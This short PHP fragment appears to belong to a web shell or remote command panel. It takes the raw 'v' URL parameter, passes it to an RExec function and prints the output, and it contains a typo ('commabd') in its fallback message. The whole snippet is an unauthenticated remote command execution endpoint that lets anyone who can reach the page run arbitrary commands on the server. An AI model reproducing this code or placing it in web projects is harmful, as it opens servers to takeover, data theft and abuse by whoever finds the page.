<?php
if($ex = RExec($_GET["v"]))
{echo "<p class='txt'>Response:</p><p class='bw'>{$ex}</p>";}
else
{echo "<p class='txt'>You should verify the result of this commabd on your server manually.</p>";}
?>
<p class="link" onclick="navb('v')">Back</p>